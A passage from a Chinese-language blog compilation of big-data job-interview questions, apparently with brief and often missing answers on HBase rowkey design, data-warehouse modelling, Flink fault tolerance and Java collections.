title="11.HBase列族和region的关系？"></a>11.HBase列族和region的关系？</h2><p>HBase有多个RegionServer，每个RegionServer里有多个Region，一个Region中存放着若干行的行键以及所对应的数据，一个列族是一个文件夹，如果经常要搜索整个一条数据，列族越少越好，如果只有一部分的数据需要经常被搜索，那么将经常搜索的建立一个列族，其他不常搜索的建立列族检索较快。</p><h2 id="12-请简述Hbase的物理模型是什么"><a href="#12-请简述Hbase的物理模型是什么" class="headerlink" title="12.请简述Hbase的物理模型是什么"></a>12.请简述Hbase的物理模型是什么</h2><h2 id="13-请问如果使用Hbase做即席查询，如何设计二级索引"><a href="#13-请问如果使用Hbase做即席查询，如何设计二级索引" class="headerlink" title="13.请问如果使用Hbase做即席查询，如何设计二级索引"></a>13.请问如果使用Hbase做即席查询，如何设计二级索引</h2><h2 id="14-如何避免读、写HBaes时访问热点问题？"><a href="#14-如何避免读、写HBaes时访问热点问题？" class="headerlink" title="14.如何避免读、写HBaes时访问热点问题？"></a>14.如何避免读、写HBaes时访问热点问题？</h2><p>（1）加盐<br>这里所说的加盐不是密码学中的加盐，而是在rowkey的前面增加随机数，具体就是给rowkey分配一个随机前缀以使得它和之前的rowkey的开头不同。给多少个前缀？这个数量应该和我们想要分散数据到不同的region的数量一致（类似hive里面的分桶）。<br>（ 自己理解：即region数量是一个范围，我们给rowkey分配一个随机数，前缀（随机数）的范围是region的数量）<br>加盐之后的rowkey就会根据随机生成的前缀分散到各个region上，以避免热点。</p><p>（2）哈希<br>哈希会使同一行永远用一个前缀加盐。哈希也可以使负载分散到整个集群，但是读却是可以预测的。使用确定的哈希可以让客户端重构完整的rowkey，可以使用get操作准确获取某一个行数据。</p><p>（3）反转<br>第三种防止热点的方法是反转固定长度或者数字格式的rowkey。这样可以使得rowkey中经常改变的部分（最没有意义的部分）放在前面。这样可以有效的随机rowkey，但是牺牲了rowkey的有序性。反转rowkey的例子：以手机号为rowkey，可以将手机号反转后的字符串作为rowkey，从而避免诸如139、158之类的固定号码开头导 致的热点问题。</p><p>（4）时间戳反转<br>一个常见的数据处理问题是快速获取数据的最近版本，使用反转的时间戳作为rowkey的一部分对这个问题十分有用，可以用Long.Max_Value – timestamp追加到key的末尾，例如[key][reverse_timestamp] ,[key] 的最新值可以通过scan [key]获得[key]的第一条记录，因为HBase中rowkey是有序的，第一条记录是最后录入的数据。</p><p>（5）尽量减少行和列的大小<br>在HBase中，value永远和它的key一起传输的。当具体的值在系统间传输时，它的rowkey，列名，时间戳也会一起传输。如果你的rowkey和列名很大，HBase storefiles中的索引（有助于随机访问）会占据HBase分配的大量内存，因为具体的值和它的key很大。可以增加block大小使得storefiles索引再更大的时间间隔增加，或者修改表的模式以减小rowkey和列名的大小。压缩也有助于更大的索引。</p><p>（6）其他办法<br>列族名的长度尽可能小，最好是只有一个字符。冗长的属性名虽然可读性好，但是更短的属性名存储在HBase中会更好。也可以在建表时预估数据规模，预留region数量，例如create ‘myspace:mytable’, SPLITS =&gt; [01,02,03,,…99]</p><h2 id="-24"><a href="#-24" class="headerlink" title></a></h2><h2 id="15-布隆过滤器在HBASE中的应用"><a href="#15-布隆过滤器在HBASE中的应用" class="headerlink" title="15.布隆过滤器在HBASE中的应用"></a>15.布隆过滤器在HBASE中的应用</h2><h2 id="-25"><a href="#-25" class="headerlink" title></a></h2><h2 id="16-Hbase是用来干嘛的-什么样的数据会放到hbase"><a href="#16-Hbase是用来干嘛的-什么样的数据会放到hbase" class="headerlink" title="16.Hbase是用来干嘛的?什么样的数据会放到hbase"></a>16.Hbase是用来干嘛的?什么样的数据会放到hbase</h2><h1 id="六-数仓"><a href="#六-数仓" class="headerlink" title="六.数仓"></a>六.数仓</h1><h2 id="1-维表和宽表的考查（主要考察维表的使用及维度退化手法）"><a href="#1-维表和宽表的考查（主要考察维表的使用及维度退化手法）" class="headerlink" title="1.维表和宽表的考查（主要考察维表的使用及维度退化手法）"></a>1.维表和宽表的考查（主要考察维表的使用及维度退化手法）</h2><p>维表数据一般根据ods层数据加工生成，在设计宽表的时候，可以适当的用一些维度退化手法，将维度退化到事实表中，减少事实表和维表的关联</p><h2 id="2-数仓表命名规范"><a href="#2-数仓表命名规范" class="headerlink" title="2.数仓表命名规范"></a>2.数仓表命名规范</h2><p>每个公司都会有点差别</p><p>ODS</p><p>ods.库名_表名_df/di/da/dz</p><p>CDM(dwd/dws)</p><p>dwd.主题_内容_df</p><h2 id="3-拉链表的使用场景"><a href="#3-拉链表的使用场景" class="headerlink" title="3.拉链表的使用场景"></a>3.拉链表的使用场景</h2><p>1.数据量比较大</p><p>2.表中的部分字段会被更新</p><p>3.需要查看某一个时间点或者时间段的历史快照信息</p><p>​      查看某一个订单在历史某一个时间点的状态</p><p>​      某一个用户在过去某一段时间，下单次数</p><p>4.更新的比例和频率不是很大<br>     如果表中信息变化不是很大，每天都保留一份全量，那么每次全量中会保存很多不变的信息，对存储是极大的浪费</p><h2 id="4-一亿条数据查的很慢-怎么查快一点"><a href="#4-一亿条数据查的很慢-怎么查快一点" class="headerlink" title="4.一亿条数据查的很慢,怎么查快一点"></a>4.一亿条数据查的很慢,怎么查快一点</h2><h2 id="5-有什么维表"><a href="#5-有什么维表" class="headerlink" title="5.有什么维表"></a>5.有什么维表</h2><p>时间维表，用户维表，医院维表等</p><h2 id="6-数据源都有哪些"><a href="#6-数据源都有哪些" class="headerlink" title="6.数据源都有哪些"></a>6.数据源都有哪些</h2><p>业务库数据源:mysql,oracle,mongo</p><p>日志数据：ng日志，埋点日志</p><p>爬虫数据</p><h2 id="7-你们最大的表是什么表-数据量多少"><a href="#7-你们最大的表是什么表-数据量多少" class="headerlink" title="7.你们最大的表是什么表,数据量多少"></a>7.你们最大的表是什么表,数据量多少</h2><p>ng日志表，三端(app,web,h5)中app端日志量最大，清洗入库后的数据一天大概xxxxW</p><h2 id="8-数仓架构体系"><a href="#8-数仓架构体系" class="headerlink" title="8.数仓架构体系"></a>8.数仓架构体系</h2><p><img src="https://mmbiz.qpic.cn/mmbiz_png/dXCnejTRMLdfqmBAvcKIhLA5ZUrVlzNcEvNDjGXuf4HOH4bHfnr0c30VLvib9SWWhYbuK9qfoVemnM6ZYcduzicg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="img"></p><h2 id="-26"><a href="#-26" class="headerlink" title></a></h2><h2 id="9-数据平台是怎样的，用到了阿里的那一套吗？"><a href="#9-数据平台是怎样的，用到了阿里的那一套吗？" class="headerlink" title="9.数据平台是怎样的，用到了阿里的那一套吗？"></a>9.数据平台是怎样的，用到了阿里的那一套吗？</h2><p>没用到阿里那一套，数据平台为自研产品</p><h2 id="-27"><a href="#-27" class="headerlink" title></a></h2><h2 id="10-你了解的调度系统有那些？，你们公司用的是哪种调度系统"><a href="#10-你了解的调度系统有那些？，你们公司用的是哪种调度系统" class="headerlink" title="10.你了解的调度系统有那些？，你们公司用的是哪种调度系统"></a>10.你了解的调度系统有那些？，你们公司用的是哪种调度系统</h2><p>airflow，azkaban，ooize，我们公司使用的是airflow</p><h2 id="-28"><a href="#-28" class="headerlink" title></a></h2><h2 id="11-你们公司数仓底层是怎么抽数据的？"><a href="#11-你们公司数仓底层是怎么抽数据的？" class="headerlink" title="11.你们公司数仓底层是怎么抽数据的？"></a>11.你们公司数仓底层是怎么抽数据的？</h2><p>业务数据用的是datax</p><p>日志数据用的是logstash</p><h2 id="-29"><a href="#-29" class="headerlink" title></a></h2><h2 id="12-为什么datax抽数据要比sqoop-快？"><a href="#12-为什么datax抽数据要比sqoop-快？" class="headerlink" title="12.为什么datax抽数据要比sqoop 快？"></a>12.为什么datax抽数据要比sqoop 快？</h2><h2 id="-30"><a href="#-30" class="headerlink" title></a></h2><h2 id="13-埋点数据你们是怎样接入的"><a href="#13-埋点数据你们是怎样接入的" class="headerlink" title="13.埋点数据你们是怎样接入的"></a>13.埋点数据你们是怎样接入的</h2><p>logstash–&gt;kafka–&gt;logstash–&gt;hdfs</p><h2 id="-31"><a href="#-31" class="headerlink" title></a></h2><h2 id="14-如果你们业务库的表有更新，你们数仓怎么处理的？"><a href="#14-如果你们业务库的表有更新，你们数仓怎么处理的？" class="headerlink" title="14.如果你们业务库的表有更新，你们数仓怎么处理的？"></a>14.如果你们业务库的表有更新，你们数仓怎么处理的？</h2><p>根据表数据量及表特性，选择用全量表，增量表，追加表和拉链表处理</p><h2 id="-32"><a href="#-32" class="headerlink" title></a></h2><h2 id="15-能独立搭建数仓吗"><a href="#15-能独立搭建数仓吗" class="headerlink" title="15.能独立搭建数仓吗"></a>15.能独立搭建数仓吗</h2><p>可以</p><h2 id="-33"><a href="#-33" class="headerlink" title></a></h2><h2 id="16-搭建过CDH-集群吗"><a href="#16-搭建过CDH-集群吗" class="headerlink" title="16.搭建过CDH 集群吗"></a>16.搭建过CDH 集群吗</h2><h2 id="-34"><a href="#-34" class="headerlink" title></a></h2><h2 id="17-说一下你们公司的大数据平台架构？你有参与吗？"><a href="#17-说一下你们公司的大数据平台架构？你有参与吗？" class="headerlink" title="17.说一下你们公司的大数据平台架构？你有参与吗？"></a>17.说一下你们公司的大数据平台架构？你有参与吗？</h2><p><img src="/2020/08/28/2020%E5%A4%A7%E6%95%B0%E6%8D%AE%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9C%9F%E9%A2%98%E6%80%BB%E7%BB%93(%E9%99%84%E7%AD%94%E6%A1%88)/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="img"></p><h2 id="-35"><a href="#-35" class="headerlink" title></a></h2><h2 id="18-介绍一下你自己的项目和所用的技术"><a href="#18-介绍一下你自己的项目和所用的技术" class="headerlink" title="18.介绍一下你自己的项目和所用的技术"></a>18.介绍一下你自己的项目和所用的技术</h2><h2 id="-36"><a href="#-36" class="headerlink" title></a></h2><h2 id="19-对目前的流和批处理的认识？就是谈谈自己的感受"><a href="#19-对目前的流和批处理的认识？就是谈谈自己的感受" class="headerlink" title="19.对目前的流和批处理的认识？就是谈谈自己的感受"></a>19.对目前的流和批处理的认识？就是谈谈自己的感受</h2><h2 id="-37"><a href="#-37" class="headerlink" title></a></h2><h2 id="20-你了解那些OLAP-引擎，MPP-知道一些吗？clickHouse-了解一些吗？你自己做过测试性能吗？"><a href="#20-你了解那些OLAP-引擎，MPP-知道一些吗？clickHouse-了解一些吗？你自己做过测试性能吗？" class="headerlink" title="20.你了解那些OLAP 引擎，MPP 知道一些吗？clickHouse 了解一些吗？你自己做过测试性能吗？"></a>20.你了解那些OLAP 引擎，MPP 知道一些吗？clickHouse 了解一些吗？你自己做过测试性能吗？</h2><h2 id="-38"><a href="#-38" class="headerlink" title></a></h2><h2 id="21-Kylin-有了解吗？介绍一下原理"><a href="#21-Kylin-有了解吗？介绍一下原理" class="headerlink" title="21.Kylin 有了解吗？介绍一下原理"></a>21.Kylin 有了解吗？介绍一下原理</h2><h2 id="-39"><a href="#-39" class="headerlink" title></a></h2><h2 id="22-datax-源码有改造过吗"><a href="#22-datax-源码有改造过吗" class="headerlink" title="22.datax 源码有改造过吗"></a>22.datax 源码有改造过吗</h2><p>改造过</p><h2 id="-40"><a href="#-40" class="headerlink" title></a></h2><h2 id="23-你们数仓的APP-层是怎么对外提供服务的？"><a href="#23-你们数仓的APP-层是怎么对外提供服务的？" class="headerlink" title="23.你们数仓的APP 层是怎么对外提供服务的？"></a>23.你们数仓的APP 层是怎么对外提供服务的？</h2><p>1.直接存入mysql业务库，业务方直接读取</p><p>2.数据存入mysql，以接口的形式提供数据</p><p>3.数据存入kylin，需求方通过jdbc读取数据</p><h2 id="-41"><a href="#-41" class="headerlink" title></a></h2><h2 id="24-数据接入进来，你们是怎样规划的，有考虑数据的膨胀问题吗"><a href="#24-数据接入进来，你们是怎样规划的，有考虑数据的膨胀问题吗" class="headerlink" title="24.数据接入进来，你们是怎样规划的，有考虑数据的膨胀问题吗"></a>24.数据接入进来，你们是怎样规划的，有考虑数据的膨胀问题吗</h2><h2 id="-42"><a href="#-42" class="headerlink" title></a></h2><h2 id="25-简述拉链表，流水表以及快照表的含义和特点"><a href="#25-简述拉链表，流水表以及快照表的含义和特点" class="headerlink" title="25.简述拉链表，流水表以及快照表的含义和特点"></a>25.简述拉链表，流水表以及快照表的含义和特点</h2><p>拉链表：</p><p>（1）记录一个事物从开始，一直到当前状态的所有变化的信息；<br>（2）拉链表每次上报的都是历史记录的最终状态，是记录在当前时刻的历史总量；<br>（3）当前记录存的是当前时间之前的所有历史记录的最后变化量（总量）；<br>（4）封链时间可以是2999，3000，9999等等比较大的年份；拉链表到期数据要报0；</p><p>流水表：对于表的每一个修改都会记录，可以用于反映实际记录的变更<br>　区别于拉链表：　<br> 拉链表通常是对账户信息的历史变动进行处理保留的结果，流水表是每天的交易形成的历史；<br> 流水表用于统计业务相关情况，拉链表用于统计账户及客户的情况</p><p> 快照表：<br> 按天分区，每一天的数据都是截止到那一天mysql的全量数据</p><h2 id="-43"><a href="#-43" class="headerlink" title></a></h2><h2 id="26-全量表-df-增量表-di-追加表-da-，拉链表-dz-的区别及使用场景"><a href="#26-全量表-df-增量表-di-追加表-da-，拉链表-dz-的区别及使用场景" class="headerlink" title="26.全量表(df),增量表(di),追加表(da)，拉链表(dz)的区别及使用场景"></a>26.全量表(df),增量表(di),追加表(da)，拉链表(dz)的区别及使用场景</h2><h2 id="27-你们公司的数仓分层，每一层是怎么处理数据的"><a href="#27-你们公司的数仓分层，每一层是怎么处理数据的" class="headerlink" title="27.你们公司的数仓分层，每一层是怎么处理数据的"></a>27.你们公司的数仓分层，每一层是怎么处理数据的</h2><h2 id="28-什么是事实表，什么是维表"><a href="#28-什么是事实表，什么是维表" class="headerlink" title="28.什么是事实表，什么是维表"></a>28.什么是事实表，什么是维表</h2><h2 id="29-星型模型和雪花模型"><a href="#29-星型模型和雪花模型" class="headerlink" title="29.星型模型和雪花模型"></a>29.星型模型和雪花模型</h2><h2 id="-44"><a href="#-44" class="headerlink" title></a></h2><h2 id="30-缓慢变化维如何处理，几种方式"><a href="#30-缓慢变化维如何处理，几种方式" class="headerlink" title="30.缓慢变化维如何处理，几种方式"></a>30.缓慢变化维如何处理，几种方式</h2><h2 id="-45"><a href="#-45" class="headerlink" title></a></h2><h2 id="31-datax与sqoop的优缺点"><a href="#31-datax与sqoop的优缺点" class="headerlink" title="31.datax与sqoop的优缺点"></a>31.datax与sqoop的优缺点</h2><h2 id="-46"><a href="#-46" class="headerlink" title></a></h2><h2 id="32-datax抽数碰到emoji表情怎么解决"><a href="#32-datax抽数碰到emoji表情怎么解决" class="headerlink" title="32.datax抽数碰到emoji表情怎么解决"></a>32.datax抽数碰到emoji表情怎么解决</h2><h2 id="-47"><a href="#-47" class="headerlink" title></a></h2><h2 id="33-工作中碰到什么困难，怎么解决的"><a href="#33-工作中碰到什么困难，怎么解决的" class="headerlink" title="33.工作中碰到什么困难，怎么解决的"></a>33.工作中碰到什么困难，怎么解决的</h2><h2 id="-48"><a href="#-48" class="headerlink" title></a></h2><h2 id="34-如何用数据给公司带来收益"><a href="#34-如何用数据给公司带来收益" class="headerlink" title="34.如何用数据给公司带来收益"></a>34.如何用数据给公司带来收益</h2><h2 id="-49"><a href="#-49" class="headerlink" title></a></h2><h2 id="35-需求驱动和业务驱动，数据开发和ETL开发，实战型和博客型"><a href="#35-需求驱动和业务驱动，数据开发和ETL开发，实战型和博客型" class="headerlink" title="35.需求驱动和业务驱动，数据开发和ETL开发，实战型和博客型"></a>35.需求驱动和业务驱动，数据开发和ETL开发，实战型和博客型</h2><h2 id="-50"><a href="#-50" class="headerlink" title></a></h2><h2 id="36-如何用数据实现业务增长，黑客增长？"><a href="#36-如何用数据实现业务增长，黑客增长？" class="headerlink" title="36.如何用数据实现业务增长，黑客增长？"></a>36.如何用数据实现业务增长，黑客增长？</h2><h2 id="-51"><a href="#-51" class="headerlink" title></a></h2><h2 id="37-什么是大数据？千万级别的数据完全可以用传统的关系型数据库集群解决，为什么要用到大数据平台。"><a href="#37-什么是大数据？千万级别的数据完全可以用传统的关系型数据库集群解决，为什么要用到大数据平台。" class="headerlink" title="37.什么是大数据？千万级别的数据完全可以用传统的关系型数据库集群解决，为什么要用到大数据平台。"></a>37.什么是大数据？千万级别的数据完全可以用传统的关系型数据库集群解决，为什么要用到大数据平台。</h2><h2 id="-52"><a href="#-52" class="headerlink" title></a></h2><h2 id="38-数据质量，元数据管理，指标体系建设，数据驱动"><a href="#38-数据质量，元数据管理，指标体系建设，数据驱动" class="headerlink" title="38.数据质量，元数据管理，指标体系建设，数据驱动"></a>38.数据质量，元数据管理，指标体系建设，数据驱动</h2><h2 id="-53"><a href="#-53" class="headerlink" title></a></h2><h2 id="39-什么是数仓-建设数仓时碰到过什么问题"><a href="#39-什么是数仓-建设数仓时碰到过什么问题" class="headerlink" title="39.什么是数仓,建设数仓时碰到过什么问题"></a>39.什么是数仓,建设数仓时碰到过什么问题</h2><h2 id="-54"><a href="#-54" class="headerlink" title></a></h2><h2 id="40-实时数仓技术选型及保证exactly-once"><a href="#40-实时数仓技术选型及保证exactly-once" class="headerlink" title="40.实时数仓技术选型及保证exactly-once"></a>40.实时数仓技术选型及保证exactly-once</h2><p>41.维度建模和范式建模的区别；</p><p>42.埋点的码表如何设计；</p><p>43.集市层和公共层的区别；</p><p>44.缓慢变化维的处理方式</p><p>45.聊聊数据质量</p><p>46.说说你从0-1搭建数仓都做了什么？你觉得最有挑战的是什么？</p><p>七.Flink</p><h2 id="1-Flink实时计算时落磁盘吗"><a href="#1-Flink实时计算时落磁盘吗" class="headerlink" title="1.Flink实时计算时落磁盘吗"></a>1.Flink实时计算时落磁盘吗</h2><p><strong>不落，是内存计算</strong></p><h2 id="-55"><a href="#-55" class="headerlink" title></a></h2><h2 id="2-日活DAU的统计需要注意什么"><a href="#2-日活DAU的统计需要注意什么" class="headerlink" title="2.日活DAU的统计需要注意什么"></a>2.日活DAU的统计需要注意什么</h2><h2 id="-56"><a href="#-56" class="headerlink" title></a></h2><h2 id="3-Flink调优"><a href="#3-Flink调优" class="headerlink" title="3.Flink调优"></a>3.Flink调优</h2><h2 id="-57"><a href="#-57" class="headerlink" title></a></h2><h2 id="4-Flink的容错是怎么做的"><a href="#4-Flink的容错是怎么做的" class="headerlink" title="4.Flink的容错是怎么做的"></a>4.Flink的容错是怎么做的</h2><p><strong>定期checkpoint存储oprator state及keyedstate到stateBackend</strong></p><h2 id="-58"><a href="#-58" class="headerlink" title="** **"></a>** **</h2><h2 id="5-Parquet格式的好处？什么时候读的快什么时候读的慢"><a href="#5-Parquet格式的好处？什么时候读的快什么时候读的慢" class="headerlink" title="5.Parquet格式的好处？什么时候读的快什么时候读的慢"></a>5.Parquet格式的好处？什么时候读的快什么时候读的慢</h2><h2 id="-59"><a href="#-59" class="headerlink" title></a></h2><h2 id="6-flink中checkPoint为什么状态有保存在内存中这样的机制？为什么要开启checkPoint"><a href="#6-flink中checkPoint为什么状态有保存在内存中这样的机制？为什么要开启checkPoint" class="headerlink" title="6.flink中checkPoint为什么状态有保存在内存中这样的机制？为什么要开启checkPoint?"></a>6.flink中checkPoint为什么状态有保存在内存中这样的机制？为什么要开启checkPoint?</h2><p>开启checkpoint可以容错，程序自动重启的时候可以从checkpoint中恢复数据</p><h2 id="-60"><a href="#-60" class="headerlink" title></a></h2><h2 id="7-flink保证Exactly-Once的原理？"><a href="#7-flink保证Exactly-Once的原理？" class="headerlink" title="7.flink保证Exactly_Once的原理？"></a>7.flink保证Exactly_Once的原理？</h2><p>1.开启checkpoint</p><p>2.source支持数据重发</p><p>3.sink支持事务，可以分2次提交，如kafka；或者sink支持幂等，可以覆盖之前写入的数据，如redis</p><p>满足以上三点，可以保证Exactly_Once</p><h2 id="-61"><a href="#-61" class="headerlink" title></a></h2><h2 id="8-flink的时间形式和窗口形式有几种？有什么区别，你们用在什么场景下的？"><a href="#8-flink的时间形式和窗口形式有几种？有什么区别，你们用在什么场景下的？" class="headerlink" title="8.flink的时间形式和窗口形式有几种？有什么区别，你们用在什么场景下的？"></a>8.flink的时间形式和窗口形式有几种？有什么区别，你们用在什么场景下的？</h2><h2 id="-62"><a href="#-62" class="headerlink" title></a></h2><h2 id="9-flink的背压说下？"><a href="#9-flink的背压说下？" class="headerlink" title="9.flink的背压说下？"></a>9.flink的背压说下？</h2><h2 id="-63"><a href="#-63" class="headerlink" title></a></h2><h2 id="10-flink的watermark机制说下，以及怎么解决数据乱序的问题？"><a href="#10-flink的watermark机制说下，以及怎么解决数据乱序的问题？" class="headerlink" title="10.flink的watermark机制说下，以及怎么解决数据乱序的问题？"></a>10.flink的watermark机制说下，以及怎么解决数据乱序的问题？</h2><h2 id="-64"><a href="#-64" class="headerlink" title></a></h2><h2 id="11-flink-on-yarn执行流程"><a href="#11-flink-on-yarn执行流程" class="headerlink" title="11.flink on yarn执行流程"></a>11.flink on yarn执行流程</h2><p><img src="/2020/08/28/2020%E5%A4%A7%E6%95%B0%E6%8D%AE%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9C%9F%E9%A2%98%E6%80%BB%E7%BB%93(%E9%99%84%E7%AD%94%E6%A1%88)/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="img"></p><p>​    Flink任务提交后，Client向HDFS上传Flink的Jar包和配置，之后向Yarn ResourceManager提交任务，ResourceManager分配Container资源并通知对应的NodeManager启动ApplicationMaster，ApplicationMaster启动后加载Flink的Jar包和配置构建环境，然后启动JobManager，之后ApplicationMaster向ResourceManager申请资源启动TaskManager，ResourceManager分配Container资源后，由ApplicationMaster通知资源所在节点的NodeManager启动TaskManager，NodeManager加载Flink的Jar包和配置构建环境并启动TaskManager，TaskManager启动后向JobManager发送心跳包，并等待JobManager向其分配任务。</p><h2 id="-65"><a href="#-65" class="headerlink" title></a></h2><h2 id="12-说一说spark-和flink-的区别"><a href="#12-说一说spark-和flink-的区别" class="headerlink" title="12.说一说spark 和flink 的区别"></a>12.说一说spark 和flink 的区别</h2><h1 id="八-Java"><a href="#八-Java" class="headerlink" title="八.Java"></a>八.Java</h1><h2 id="1-hashMap底层源码，数据结构"><a href="#1-hashMap底层源码，数据结构" class="headerlink" title="1.hashMap底层源码，数据结构"></a>1.hashMap底层源码，数据结构</h2><h2 id="2-写出你用过的设计模式，并举例说明解决的实际问题"><a href="#2-写出你用过的设计模式，并举例说明解决的实际问题" class="headerlink" title="2.写出你用过的设计模式，并举例说明解决的实际问题"></a>2.写出你用过的设计模式，并举例说明解决的实际问题</h2><h2 id="3-Java创建线程的几种方式"><a href="#3-Java创建线程的几种方式" class="headerlink" title="3.Java创建线程的几种方式"></a>3.Java创建线程的几种方式</h2><ol><li>继承Thread类，重写run方法</li><li>实现Runnable接口，实现run方法</li><li>通过线程池获取线程</li><li>实现Callable接口并实现call方法，创建该类的实例，使用FutureTask类包装Callable对象，使用FutureTask对象作为Thread对象的target创建并启用新线程</li></ol><h2 id="4-请简述操作系统的线程和进程的区别"><a href="#4-请简述操作系统的线程和进程的区别" class="headerlink" title="4.请简述操作系统的线程和进程的区别"></a>4.请简述操作系统的线程和进程的区别</h2><h2 id="5-Java程序出现OutOfMemoryError-unable-to-create-new-native-thread-的原因可能有哪些？如何分析和解决？"><a href="#5-Java程序出现OutOfMemoryError-unable-to-create-new-native-thread-的原因可能有哪些？如何分析和解决？" class="headerlink" title="5.Java程序出现OutOfMemoryError:unable to create new native thread 的原因可能有哪些？如何分析和解决？"></a>5.Java程序出现OutOfMemoryError:unable to create new native thread 的原因可能有哪些？如何分析和解决？</h2><h2 id="6-采用java或自己熟悉的任何语言分别实现简单版本的线性表和链表，只需实现add-remove方法即可"><a href="#6-采用java或自己熟悉的任何语言分别实现简单版本的线性表和链表，只需实现add-remove方法即可" class="headerlink" title="6.采用java或自己熟悉的任何语言分别实现简单版本的线性表和链表，只需实现add,remove方法即可"></a>6.采用java或自己熟悉的任何语言分别实现简单版本的线性表和链表，只需实现add,remove方法即可</h2><h2 id="7-ArrayList和LinkedList的区别"><a href="#7-ArrayList和LinkedList的区别" class="headerlink" title="7.ArrayList和LinkedList的区别"></a>7.ArrayList和LinkedList的区别</h2><h2 id="8-JVM-内存分哪几个区，每个区的作用是什么"><a href="#8-JVM-内存分哪几个区，每个区的作用是什么" class="headerlink" title="8.JVM 内存分哪几个区，每个区的作用是什么?"></a>8.JVM 内存分哪几个区，每个区的作用是什么?</h2><p>9.Java中迭代器和集合的区别？</p><h2 id="-66"><a href="#-66" class="headerlink" title></a></h2><p>集合是将所有数据加载到内存，然后通过集合的方法去内存中获取，而迭代器是一个对象，实现了Iterator接口，实现了接口的hasNext和Next方法。</p><h2 id="-67"><a href="#-67" class="headerlink" title></a></h2><h2 id="10-HashMap-和-HashTable-区别"><a href="#10-HashMap-和-HashTable-区别" class="headerlink" title="10.HashMap 和 HashTable 区别"></a>10.HashMap 和 HashTable 区别</h2><p>1) 线程安全性不同</p><p>HashMap 是线程不安全的，HashTable 是线程安全的，其中的方法是 Synchronize 的，</p><p>在多线程并发的情况下，可以直接使用 HashTabl，但是使用 HashMap 时必须自己增加同步</p><p>处理。</p><p>2) 是否提供 contains 方法</p><p>HashMap 只有 containsValue 和 containsKey 方法；HashTable 有 contains、containsKey</p><p>和 containsValue 三个方法，其中 contains 和 containsValue 方法功能相同。</p><p>3) key 和 value 是否允许 null 值</p><p>Hashtable 中，key 和 value 都不允许出现 null 值。HashMap 中，null 可以作为键，这</p><p>样的键只有一个；可以有一个或多个键所对应的值为 null。</p><p>4) 数组初始化和扩容机制</p><p>HashTable 在不指定容量的情况下的默认容量为 11，而 HashMap 为 16，Hashtable 不</p><p>要求底层数组的容量一定要为 2 的整数次幂，而 HashMap 则要求一定为 2 的整数次幂。</p><p>Hashtable 扩容时，将容量变为原来的 2 倍加 1，而 HashMap 扩容时，将容量变为原</p><p>来的 2 倍。</p><h2 id="-68"><a href="#-68" class="headerlink" title></a></h2><h2 id="11-线程池使用注意哪些方面？"><a href="#11-线程池使用注意哪些方面？" class="headerlink" title="11.线程池使用注意哪些方面？"></a>11.线程池使用注意哪些方面？</h2><p>线程池分为单线程线程池，固定大小线程池，可缓冲的线程池</p><h2 id="-69"><a href="#-69" class="headerlink" title></a></h2><h2 id="12-HashMap和TreeMap的区别？TreeMap排序规则？"><a href="#12-HashMap和TreeMap的区别？TreeMap排序规则？" class="headerlink" title="12.HashMap和TreeMap的区别？TreeMap排序规则？"></a>12.HashMap和TreeMap的区别？TreeMap排序规则？</h2><p>TreeMap会自动进行排序，根据key的Compare方法进行排序</p><h2 id="-70"><a href="#-70" class="headerlink" title></a></h2><h2 id="13-用java实现单例模式"><a href="#13-用java实现单例模式" class="headerlink" title="13.用java实现单例模式"></a>13.用java实现单例模式</h2><h2 id="-71"><a href="#-71" class="headerlink" title></a></h2><h2 id="14-使用递归算法求n的阶乘：n-语言不限"><a href="#14-使用递归算法求n的阶乘：n-语言不限" class="headerlink" title="14.使用递归算法求n的阶乘：n! ,语言不限"></a>14.使用递归算法求n的阶乘：n! ,语言不限</h2><h2 id="-72"><a href="#-72" class="headerlink" title></a></h2><h2 id="15-HashMap和Hashtable的区别是什么"><a href="#15-HashMap和Hashtable的区别是什么" class="headerlink" title="15.HashMap和Hashtable的区别是什么"></a>15.HashMap和Hashtable的区别是什么</h2><h2 id="-73"><a href="#-73" class="headerlink" title></a></h2><h2 id="16-TreeSet-和-HashSet-区别"><a href="#16-TreeSet-和-HashSet-区别" class="headerlink" title="16.TreeSet 和 HashSet 区别"></a>16.TreeSet 和 HashSet 区别</h2><p>HashSet 是采用 hash 表来实现的。其中的元素没有按顺序排列，add()、remove()以及</p><p>contains()等方法都是复杂度为 O(1)的方法。</p><p>TreeSet 是采用树结构实现（红黑树算法）。元素是按顺序进行排列，但是 add()、</p><p>remove()以及 contains()等方法都是复杂度为 O(log (n))的方法。它还提供了一些方法来处理</p><p>排序的 set，如 first()，last()，headSet()，tailSet()等等。</p><h2 id="-74"><a href="#-74" class="headerlink" title></a></h2><h2 id="17-Stringbuffer-和-Stringbuild-区别"><a href="#17-Stringbuffer-和-Stringbuild-区别" class="headerlink" title="17.Stringbuffer 和 Stringbuild 区别"></a>17.Stringbuffer 和 Stringbuild 区别</h2><p>1、StringBuffer 与 StringBuilder 中的方法和功能完全是等价的。</p><p>2、只是 StringBuffer 中的方法大都采用了 synchronized 关键字进行修饰，因此是线程</p><p>安全的，而 StringBuilder 没有这个修饰，可以被认为是线程不安全的。</p><p>3、在单线程程序下，StringBuilder 效率更快，因为它不需要加锁，不具备多线程安全</p><p>而 StringBuffer 则每次都需要判断锁，效率相对更低</p><h2 id="-75"><a href="#-75" class="headerlink" title></a></h2><h2 id="18-Final、Finally、Finalize"><a href="#18-Final、Finally、Finalize" class="headerlink" title="18.Final、Finally、Finalize"></a>18.Final、Finally、Finalize</h2><p>final：修饰符（关键字）有三种用法：修饰类、变量和方法。修饰类时，意味着它不</p><p>能再派生出新的子类，即不能被继承，因此它和 abstract 是反义词。修饰变量时，该变量</p><p>使用中不被改变，必须在声明时给定初值，在引用中只能读取不可修改，即为常量。修饰</p><p>方法时，也同样只能使用，不能在子类中被重写。</p><p>finally：通常放在 try…catch 的后面构造最终执行代码块，这就意味着程序无论正常执</p><p>行还是发生异常，这里的代码只要 JVM 不关闭都能执行，可以将释放外部资源的代码写在</p><p>finally 块中。</p><p>finalize：Object 类中定义的方法，Java 中允许使用 finalize() 